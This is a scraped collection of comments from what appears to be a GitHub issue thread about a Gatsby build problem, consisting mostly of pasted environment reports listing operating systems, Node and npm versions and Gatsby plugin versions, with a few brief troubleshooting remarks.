system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9880h cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.11.0 - ~/.nvm/versions/node/v13.11.0/bin/node yarn: 1.22.5 - /usr/local/bin/yarn npm: 6.14.8 - ~/.nvm/versions/node/v13.11.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 safari: 13.1.2 npmpackages: gatsby: ^2.24.54 => 2.24.54 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-canonical-urls: ^2.3.9 => 2.3.10 gatsby-plugin-catch-links: ^2.3.11 => 2.3.11 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-google-tagmanager: ^2.3.10 => 2.3.11 gatsby-plugin-manifest: ^2.4.28 => 2.4.28 gatsby-plugin-netlify: ^2.3.14 => 2.3.14 gatsby-plugin-nprogress: ^2.3.9 => 2.3.10 gatsby-plugin-offline: ^3.2.27 => 3.2.27 gatsby-plugin-react-helmet: ^3.3.9 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sass: ^2.3.10 => 2.3.12 gatsby-plugin-sharp: ^2.6.32 => 2.6.32 gatsby-plugin-sitemap: ^2.4.12 => 2.4.12 gatsby-plugin-smoothscroll: ^1.2.0 => 1.2.0 gatsby-remark-embedder: ^3.0.0 => 3.0.0 gatsby-remark-images: ^3.3.29 => 3.3.29 gatsby-remark-images-contentful: ^2.3.16 => 2.3.16 gatsby-remark-relative-images: ^2.0.2 => 2.0.2 gatsby-source-contentful: ^2.3.42 => 2.3.42 gatsby-source-filesystem: ^2.3.28 => 2.3.28 gatsby-transformer-remark: ^2.8.33 => 2.8.33 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.68
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.9.0 - /usr/local/bin/node npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: firefox: 80.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.24.54 => 2.24.54 gatsby-cli: ^2.12.92 => 2.12.92 gatsby-image: ^2.4.17 => 2.4.17 gatsby-plugin-catch-links: ^2.3.2 => 2.3.11 gatsby-plugin-emotion: ^4.3.2 => 4.3.10 gatsby-plugin-feed-mdx: ^1.0.1 => 1.0.1 gatsby-plugin-google-analytics: ^2.3.2 => 2.3.13 gatsby-plugin-google-tagmanager: ^2.3.3 => 2.3.11 gatsby-plugin-manifest: ^2.4.28 => 2.4.28 gatsby-plugin-mdx: ^1.2.38 => 1.2.38 gatsby-plugin-offline: ^3.2.27 => 3.2.27 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.10 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sharp: ^2.6.32 => 2.6.32 gatsby-plugin-sitemap: ^2.4.12 => 2.4.12 gatsby-remark-copy-linked-files: ^2.3.14 => 2.3.14 gatsby-remark-external-links: 0.0.4 => 0.0.4 gatsby-remark-images: ^3.3.29 => 3.3.29 gatsby-remark-prismjs: ^3.5.11 => 3.5.11 gatsby-remark-reading-time: ^1.1.0 => 1.1.0 gatsby-remark-smartypants: ^2.3.2 => 2.3.10 gatsby-source-filesystem: ^2.3.28 => 2.3.28 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.92
system: os: windows 10 10.0.18363 cpu: (8) x64 intel(r) core(tm) i7-6700k cpu @ 4.00ghz binaries: node: 14.9.0 - c:\\program files\ odejs\ ode.exe npm: 6.14.8 - c:\\program files\ odejs\ pm.cmd languages: python: 3.8.5 browsers: chrome: 85.0.4183.83 edge: spartan (44.18362.449.0) npmpackages: gatsby: ^2.24.50 => 2.24.53 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.4.24 => 2.4.27 gatsby-plugin-offline: ^3.2.24 => 3.2.26 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.28 => 2.6.31 gatsby-source-filesystem: ^2.3.25 => 2.3.27 gatsby-transformer-sharp: ^2.5.13 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.91 i have also searched around other issues, but they always seem to have some moving part to consider that this does not (netlify, for example)
i have tried
- running `gatsby clean`, deleting node_modules, running `npm i`, rebuilding and reserving.
- removing every gatsby package except gatsby itself.
- running `npm update` and retrying the above.
``` system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.8 - /usr/local/bin/zsh binaries: node: 14.9.0 - ~/.nvm/versions/node/v14.9.0/bin/node npm: 6.14.8 - ~/.nvm/versions/node/v14.9.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 edge: 85.0.564.44 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.53 => 2.24.53 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.4.27 => 2.4.27 gatsby-plugin-offline: ^3.2.26 => 3.2.26 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.31 => 2.6.31 gatsby-source-filesystem: ^2.3.27 => 2.3.27 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.91
system: os: linux 5.4 linux mint 20 (ulyana) cpu: (8) x64 intel(r) core(tm) i7-4810mq cpu @ 2.80ghz shell: 5.0.17 - /bin/bash binaries: node: 14.8.0 - /usr/bin/node npm: 6.14.7 - /usr/bin/npm browsers: chrome: 84.0.4147.135 firefox: 79.0 npmpackages: gatsby: ^2.24.15 => 2.24.15 gatsby-cli: ^2.12.47 => 2.12.47 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-import: ^2.1.5 => 2.1.5 gatsby-plugin-manifest: ^2.4.11 => 2.4.12 gatsby-plugin-modal-routing: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^3.2.9 => 3.2.11 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-s3: ^0.3.4 => 0.3.4 gatsby-plugin-sharp: ^2.6.11 => 2.6.12 gatsby-source-filesystem: ^2.3.11 => 2.3.12 gatsby-source-pg: ^0.2.1 => 0.2.1 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 npmglobalpackages: gatsby: 2.24.15
system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-7360u cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 10.13.0 - ~/.nvm/versions/node/v10.13.0/bin/node yarn: 1.12.3 - /usr/local/bin/yarn npm: 6.4.1 - ~/.nvm/versions/node/v10.13.0/bin/npm languages: python: 2.7.15 - /usr/local/bin/python browsers: safari: 13.1.2 npmpackages: gatsby: ^2.24.53 => 2.24.53 gatsby-plugin-freshchat: ^1.0.0-rc1 => 1.0.0-rc1 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sass: ^2.3.12 => 2.3.12 npmglobalpackages: gatsby-cli: 2.12.91
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-8569u cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.10.1 - /usr/local/bin/node npm: 6.13.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 76.0.1 safari: 13.1.2 npmpackages: gatsby: ^2.24.53 => 2.24.53 gatsby-plugin-react-helmet: ^3.0.6 => 3.3.10 gatsby-plugin-typography: ^2.2.7 => 2.5.10 gatsby-source-apiserver: ^2.1.0 => 2.1.7 gatsby-source-filesystem: ^2.0.20 => 2.3.27 gatsby-transformer-json: ^2.1.8 => 2.4.11 gatsby-transformer-remark: ^2.2.5 => 2.8.32 npmglobalpackages: gatsby-cli: 2.12.91
system: os: macos 10.15.6 cpu: (16) x64 intel(r) core(tm) i9-9980hk cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.8.0 - ~/.nvm/versions/node/v14.8.0/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.14.7 - ~/.nvm/versions/node/v14.8.0/bin/npm languages: python: 3.7.3 - /users/myusername/.pyenv/shims/python browsers: chrome: 85.0.4183.83 firefox: 80.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-catch-links: ^2.3.11 => 2.3.11 gatsby-plugin-emotion: ^4.3.10 => 4.3.10 gatsby-plugin-manifest: ^2.4.23 => 2.4.23 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-plugin-typescript: ^2.4.18 => 2.4.18 gatsby-remark-images: ^3.3.25 => 3.3.25 gatsby-remark-prismjs: ^3.5.10 => 3.5.10 gatsby-remark-responsive-iframe: ^2.4.12 => 2.4.12 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-remark: ^2.8.28 => 2.8.28 gatsby-transformer-sharp: ^2.5.13 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.87
ubuntu os "gatsby": "^2.24.50", "gatsby-image": "^2.4.16", "gatsby-plugin-sharp": "^2.6.28", "gatsby-source-graphql": "^2.7.2", "gatsby-transformer-sharp": "^2.5.13",
system: os: linux 4.15 ubuntu 18.04.4 lts (bionic beaver) cpu: (12) x64 intel(r) xeon(r) e-2176m cpu @ 2.70ghz shell: 5.4.2 - /usr/bin/zsh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.21.1 - /usr/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.17 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 80.0 npmpackages: gatsby: ^2.21.13 => 2.24.23 gatsby-image: ^2.4.1 => 2.4.14 gatsby-plugin-catch-links: ^2.3.3 => 2.3.11 gatsby-plugin-google-tagmanager: ^2.3.1 => 2.3.11 gatsby-plugin-manifest: ^2.4.2 => 2.4.21 gatsby-plugin-offline: ^3.2.1 => 3.2.21 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.10 gatsby-plugin-sharp: ^2.6.1 => 2.6.24 gatsby-plugin-stylus: ^2.3.1 => 2.3.10 gatsby-plugin-twitter: ^2.3.1 => 2.3.10 gatsby-remark-autolink-headers: ^2.3.3 => 2.3.11 gatsby-remark-classes: ^1.0.0 => 1.0.0 gatsby-remark-prismjs: ^3.5.1 => 3.5.10 gatsby-source-filesystem: ^2.3.1 => 2.3.23 gatsby-transformer-remark: ^2.8.7 => 2.8.27 gatsby-transformer-sharp: ^2.5.1 => 2.5.12 npmglobalpackages: gatsby-cli: 2.12.21 ![screenshot from 2020-09-02 16-01-13](
![screenshot from 2020-09-02 16-00-57](
system: os: linux 5.4 linux mint 20 (ulyana) cpu: (8) x64 intel(r) core(tm) i7-4810mq cpu @ 2.80ghz shell: 5.0.17 - /bin/bash binaries: node: 14.8.0 - /usr/bin/node npm: 6.14.7 - /usr/bin/npm browsers: chrome: 84.0.4147.135 firefox: 79.0 npmpackages: gatsby: ^2.24.15 => 2.24.15 gatsby-cli: ^2.12.47 => 2.12.47 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-import: ^2.1.5 => 2.1.5 gatsby-plugin-manifest: ^2.4.11 => 2.4.12 gatsby-plugin-modal-routing: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^3.2.9 => 3.2.11 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.4 gatsby-plugin-root-import: ^2.0.5 => 2.0.5 gatsby-plugin-s3: ^0.3.4 => 0.3.4 gatsby-plugin-sharp: ^2.6.11 => 2.6.12 gatsby-source-filesystem: ^2.3.11 => 2.3.12 gatsby-source-pg: ^0.2.1 => 0.2.1 gatsby-transformer-sharp: ^2.5.5 => 2.5.5 npmglobalpackages: gatsby: 2.24.15
system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i5-8210y cpu @ 1.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 13.7.0 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.14.8 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.135 safari: 13.1.2 npmpackages: gatsby: ^2.24.11 => 2.24.11 gatsby-image: ^2.4.6 => 2.4.6 gatsby-plugin-eslint: ^2.0.8 => 2.0.8 gatsby-plugin-favicon: ^3.1.6 => 3.1.6 gatsby-plugin-google-tagmanager: ^2.3.11 => 2.3.11 gatsby-plugin-html-attributes: ^1.0.5 => 1.0.5 gatsby-plugin-manifest: ^2.4.21 => 2.4.21 gatsby-plugin-modal-routing: ^1.2.0 => 1.2.0 gatsby-plugin-offline: ^3.2.8 => 3.2.8 gatsby-plugin-react-css-modules: ^2.3.4 => 2.3.4 gatsby-plugin-react-helmet: ^3.3.3 => 3.3.3 gatsby-plugin-sharp: ^2.6.10 => 2.6.10 gatsby-plugin-styled-components: ^3.3.3 => 3.3.3 gatsby-remark-images-contentful: ^2.3.4 => 2.3.4 gatsby-source-contentful: ^2.3.14 => 2.3.14 gatsby-source-filesystem: ^2.3.10 => 2.3.10 gatsby-transformer-sharp: ^2.5.4 => 2.5.4 gatsby-transformer-sqip: ^2.3.10 => 2.3.10 npmglobalpackages: gatsby-cli: 2.12.65
``` system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i7-7700hq cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.135 firefox: 78.0.2 safari: 13.1.1 npmpackages: gatsby: ^2.24.53 => 2.24.53 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.4.27 => 2.4.27 gatsby-plugin-offline: ^3.2.26 => 3.2.26 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.31 => 2.6.31 gatsby-plugin-styled-components: ^3.3.10 => 3.3.10 gatsby-source-fetch: ^1.0.3 => 1.0.3 gatsby-source-filesystem: ^2.3.27 => 2.3.27 gatsby-source-graphql-universal: 3.3.0 => 3.3.0 gatsby-source-prismic-graphql: ^3.6.2 => 3.6.2 gatsby-transformer-csv: ^2.3.10 => 2.3.10 gatsby-transformer-sharp: ^2.5.14 => 2.5.14 npmglobalpackages: gatsby-cli: 2.12.88
``` system: os: macos 10.15.6 cpu: (4) x64 intel(r) core(tm) i7-6567u cpu @ 3.30ghz shell: 5.5.1 - /usr/local/bin/zsh binaries: node: 14.9.0 - /var/folders/v0/ssn2yzps0wq9j6ngd3128_440000gn/t/yarn--1598958475618-0.769255823079813/node yarn: 1.22.5 - /var/folders/v0/ssn2yzps0wq9j6ngd3128_440000gn/t/yarn--1598958475618-0.769255823079813/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 78.0.2 safari: 13.1.2
system: os: linux 5.4 ubuntu 20.04.1 lts (focal fossa) cpu: (8) x64 amd ryzen 7 2700u with radeon vega mobile gfx shell: 5.0.17 - /bin/bash binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.18 - /usr/bin/python browsers: chrome: 84.0.4147.105 firefox: 80.0 npmpackages: gatsby: ^2.23.12 => 2.24.53 gatsby-background-image: ^1.1.1 => 1.1.2 gatsby-image: ^2.4.15 => 2.4.16 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-layout: ^1.3.10 => 1.3.10 gatsby-plugin-manifest: ^2.4.21 => 2.4.27 gatsby-plugin-module-resolver: ^1.0.3 => 1.0.3 gatsby-plugin-offline: ^3.2.21 => 3.2.26 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-react-svg: ^3.0.0 => 3.0.0 gatsby-plugin-sharp: 2.6.26 => 2.6.26 gatsby-source-filesystem: ^2.3.24 => 2.3.27 gatsby-source-graphql: ^2.7.1 => 2.7.2 gatsby-transformer-sharp: ^2.5.13 => 2.5.14
``` system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-8750h cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.16.1 - ~/.nvm/versions/node/v12.16.1/bin/node yarn: 1.21.1 - /usr/local/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.1/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 75.0 safari: 13.1.2 npmglobalpackages: gatsby-cli: 2.11.5
``` system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i5-1030ng7 cpu @ 1.10ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.2.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 85.0.4183.83 firefox: 79.0 safari: 13.0.5 npmpackages: gatsby: ^2.24.50 => 2.24.50
``` i'd love to help to fix this issue, storybook or any visual testing tool would be so handy to help share a ui library i'm working on with the wider design team
webpack config and babel is just a topic i know very little on, so not really sure where to start :( cheers
```text system: os: linux 4.19 debian gnu/linux 9 (stretch) 9 (stretch) cpu: (12) x64 intel(r) core(tm) i7-8850h cpu @ 2.60ghz shell: 4.4.12 - /bin/bash binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.13 - /usr/bin/python npmpackages: gatsby: ^2.24.52 => 2.24.52 gatsby-source-sanity: ^6.0.3 => 6.0.3
not relevant.
<summary>toggle environment</summary> ``` system: os: macos 11.0 cpu: (8) x64 intel(r) core(tm) i7-8569u cpu @ 2.80ghz shell: 5.8 - /bin/zsh binaries: node: 14.8.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.135 safari: 14.0 npmpackages: gatsby: ^2.24.50 => 2.24.50 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.4.24 => 2.4.24 gatsby-plugin-offline: ^3.2.24 => 3.2.24 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.28 => 2.6.28 gatsby-source-filesystem: ^2.3.25 => 2.3.25 gatsby-transformer-sharp: ^2.5.13 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.90
system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-8569u cpu @ 2.80ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - ~/.nvm/versions/node/v12.18.3/bin/node npm: 6.14.6 - ~/.nvm/versions/node/v12.18.3/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.105 safari: 13.1.2 npmpackages: gatsby: ^2.24.51 => 2.24.51 gatsby-image: ^2.4.9 => 2.4.9 gatsby-plugin-loadable-components-ssr: ^2.1.0 => 2.1.0 gatsby-plugin-manifest: ^2.4.14 => 2.4.14 gatsby-plugin-postcss: ^2.3.6 => 2.3.6 gatsby-plugin-react-helmet: ^3.3.6 => 3.3.6 gatsby-plugin-robots-txt: ^1.5.1 => 1.5.1 gatsby-plugin-sharp: ^2.6.14 => 2.6.14 gatsby-plugin-sitemap: ^2.4.11 => 2.4.11 gatsby-plugin-webpack-bundle-analyzer: ^1.0.5 => 1.0.5 gatsby-source-contentful: ^2.3.39 => 2.3.39 gatsby-source-filesystem: ^2.3.14 => 2.3.14 gatsby-transformer-sharp: ^2.5.7 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.69
``` system: os: macos mojave 10.14.6 cpu: (8) x64 intel(r) core(tm) i7-6820hq cpu @ 2.70ghz shell: 5.3 - /bin/zsh binaries: node: 12.16.3 - ~/.nvm/versions/node/v12.16.3/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.16.3/bin/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 84.0.4147.135 firefox: 81.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.12 => 2.24.12 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-manifest: ^2.2.4 => 2.2.4 gatsby-plugin-mdx: ^1.0.0 => 1.0.22 gatsby-plugin-offline: ^2.2.4 => 2.2.4 gatsby-plugin-react-helmet: ^3.1.3 => 3.1.3 gatsby-plugin-sharp: ^2.6.29 => 2.6.29 gatsby-remark-images: ^3.3.27 => 3.3.27 gatsby-source-filesystem: ^2.3.25 => 2.3.25 gatsby-transformer-sharp: ^2.5.13 => 2.5.13 npmglobalpackages: gatsby-cli: 2.12.29
system: os: macos 10.15.1 cpu: (8) x64 intel(r) core(tm) i5-8279u cpu @ 2.40ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.14.0 - ~/.nvm/versions/node/v12.14.0/bin/node yarn: 1.22.4 - ~/.nvm/versions/node/v12.14.0/bin/yarn npm: 6.13.4 - ~/.nvm/versions/node/v12.14.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.135 safari: 13.0.3 npmpackages: gatsby: 2.24.7 => 2.24.7 gatsby-plugin-env-variables: 1.0.1 => 1.0.1 gatsby-plugin-less: 2.0.11 => 2.0.11 gatsby-plugin-manifest: 2.4.19 => 2.4.19 gatsby-plugin-react-helmet: 3.0.8 => 3.0.8 npmglobalpackages: gatsby-cli: 2.12.43
system: os: macos mojave 10.14.5 cpu: (8) x64 intel(r) core(tm) i7-7920hq cpu @ 3.10ghz shell: 5.3 - /bin/zsh binaries: node: 10.13.0 - /usr/local/bin/node yarn: yarn install v0.27.5
[1/4] resolving packages...
[2/4] fetching packages...
[3/4] linking dependencies...
[4/4] building fresh packages...
done in 47.81s
- /usr/local/bin/yarn npm: 6.14.4 - /usr/local/bin/npm languages: python: 2.7.10 - /usr/bin/python browsers: chrome: 84.0.4147.135 firefox: 77.0.1 safari: 12.1.1 npmpackages: gatsby: ^2.22.0 => 2.22.0 gatsby-awesome-pagination: ^0.3.6 => 0.3.6 gatsby-image: ^2.4.7 => 2.4.7 gatsby-plugin-asset-path: ^3.0.2 => 3.0.2 gatsby-plugin-google-tagmanager: ^2.3.11 => 2.3.11 gatsby-plugin-lodash: ^3.3.1 => 3.3.1 gatsby-plugin-netlify: ^2.3.2 => 2.3.2 gatsby-plugin-netlify-cache: ^1.2.0 => 1.2.0 gatsby-plugin-prefetch-google-fonts: ^1.4.3 => 1.4.3 gatsby-plugin-purgecss: ^4.0.1 => 4.0.1 gatsby-plugin-react-helmet: ^3.3.1 => 3.3.1 gatsby-plugin-remote-images: ^2.1.0 => 2.1.0 gatsby-plugin-sass: ^2.3.1 => 2.3.1 gatsby-plugin-sharp: ^2.6.6 => 2.6.6 gatsby-remark-images: ^3.3.5 => 3.3.5 gatsby-source-filesystem: ^2.3.18 => 2.3.18 gatsby-source-wordpress: ^3.3.5 => 3.3.5 gatsby-transformer-remark: ^2.8.10 => 2.8.10 gatsby-transformer-sharp: ^2.5.2 => 2.5.2 gatsby-wordpress-reading-time: ^1.0.4 => 1.0.4 npmglobalpackages: gatsby-cli: 2.8.29
``` system: os: macos 10.15.6 cpu: (8) x64 intel(r) core(tm) i7-1068ng7 cpu @ 2.30ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.8.0 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.7 - /usr/local/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.135 safari: 13.1.2 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-image: ^2.4.16 => 2.4.16 gatsby-plugin-feed: ^2.5.11 => 2.5.11 gatsby-plugin-google-analytics: ^2.3.13 => 2.3.13 gatsby-plugin-manifest: ^2.4.23 => 2.4.23 gatsby-plugin-offline: ^3.2.23 => 3.2.23 gatsby-plugin-react-helmet: ^3.3.10 => 3.3.10 gatsby-plugin-sharp: ^2.6.27 => 2.6.27 gatsby-plugin-typography: ^2.5.10 => 2.5.10 gatsby-remark-copy-linked-files: ^2.3.12 => 2.3.12 gatsby-remark-embed-snippet: ^4.3.14 => 4.3.14 gatsby-remark-images: ^3.3.25 => 3.3.25 gatsby-remark-prismjs: ^3.5.10 => 3.5.10 gatsby-remark-responsive-iframe: ^2.4.12 => 2.4.12 gatsby-remark-smartypants: ^2.3.10 => 2.3.10 gatsby-source-filesystem: ^2.3.24 => 2.3.24 gatsby-transformer-remark: ^2.8.28 => 2.8.28 gatsby-transformer-sharp: ^2.5.13 => 2.5.13
system: os: macos 10.15.6 cpu: (12) x64 intel(r) core(tm) i7-9750h cpu @ 2.60ghz shell: 5.7.1 - /bin/zsh binaries: node: 12.18.3 - /usr/local/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.6 - /usr/local/bin/npm languages: python: 2.7.16 - /users/jiangry/.pyenv/shims/python browsers: chrome: 84.0.4147.135 firefox: 79.0 safari: 13.1.2 npmpackages: gatsby: ^2.24.47 => 2.24.47 gatsby-plugin-typography: ^2.5.10 => 2.5.10 npmglobalpackages: gatsby-cli: 2.12.88
system: os: macos 10.15.3 cpu: (8) x64 intel(r) core(tm) i7-4770hq cpu @ 2.20ghz shell: 5.7.1 - /bin/zsh binaries: node: 14.5.0 - ~/.nvm/versions/node/v14.5.0/bin/node yarn: 1.22.4 - /usr/local/bin/yarn npm: 6.14.5 - ~/.nvm/versions/node/v14.5.0/bin/npm languages: python: 2.7.16 - /usr/bin/python browsers: chrome: 84.0.4147.135 firefox: 77.0.1 safari: 13.0.5 npmpackages: gatsby: ^2.22.15 => 2.23.11 gatsby-image: ^2.4.5 => 2.4.9 gatsby-plugin-manifest: ^2.4.9 => 2.4.14 gatsby-plugin-offline: ^3.2.7 => 3.2.13 gatsby-plugin-postcss: ^2.3.4 => 2.3.6 gatsby-plugin-react-helmet: ^3.3.4 => 3.3.6 gatsby-plugin-sharp: ^2.6.9 => 2.6.14 gatsby-source-filesystem: ^2.3.8 => 2.3.14 gatsby-source-storyblok: ^0.2.6 => 0.2.6 gatsby-transformer-sharp: ^2.5.3 => 2.5.7 npmglobalpackages: gatsby-cli: 2.12.87
system: os: macos 10.15.5 cpu: (8) x64 intel(r) core(tm) i5-1038ng7 cpu @ 2.00ghz shell: 3.2.57 - /bin/bash binaries: node: 12.16.3 - /var/folders/y3/qx7d738x02vdw1w0t57ljb5w0000gn/t/yarn--1598265666178-0.6475163283741687/node yarn: 1.22.4 - /var/folders/y3/qx7d738x02vdw1w0t57ljb5w0000gn/t/yarn--1598265666178-0.6475163283741687/yarn npm: 6.14.4 - ~/.nvm/versions/node/v12.16.3/bin/npm browsers: chrome: 84.0.4147.135 firefox: 79.0 safari: 13.1.1 npmpackages: gatsby: ^1.9.119 => 1.9.279 gatsby-link: ^1.6.28 => 1.6.46 gatsby-plugin-react-helmet: ^1.0.8 => 1.0.8 gatsby-plugin-typescript: ^1.4.10 => 1.4.20 gatsby-source-google-sheets: ^1.1.1 => 1.1.1
system: os: linux 4.19 ubuntu 20.04.1 lts (focal fossa) cpu: (8) x64 intel(r) core(tm) i7-7700k cpu @ 4.20ghz shell: 5.8 - /usr/bin/zsh binaries: node: 12.18.3 - /tmp/yarn--1598220669129-0.9999174876381276/node yarn: 1.22.4 - /tmp/yarn--1598220669129-0.9999174876381276/yarn npm: 6.14.6 - ~/.nvm/versions/node/v12.18.3/bin/npm browsers: chrome: 84.0.4147.125 npmpackages: gatsby: ^2.24.48-incbuild-collections.5 => 2.24.48-incbuild-collections.5+598335ebeb gatsby-image: ^2.4.5 => 2.4.5 gatsby-plugin-linaria: ^2.0.0 => 2.0.0 gatsby-plugin-manifest: ^2.4.9 => 2.4.9 gatsby-plugin-mdx: ^1.2.15 => 1.2.15 gatsby-plugin-offline: ^3.2.7 => 3.2.7 gatsby-plugin-react-helmet: ^3.3.2 => 3.3.2 gatsby-plugin-remove-generator: ^1.0.5 => 1.0.5 gatsby-plugin-sharp: ^2.6.9 => 2.6.9 gatsby-remark-copy-linked-files: ^2.3.12 => 2.3.12 gatsby-remark-shiki-twoslash: ^0.6.1 => 0.6.1 gatsby-source-filesystem: ^2.3.8 => 2.3.8 gatsby-transformer-sharp: ^2.5.3 => 2.5.3
i couldn't run gatsby info even after installing the cli
i don't know whats going on., but here are the dependencies in my package.json ```
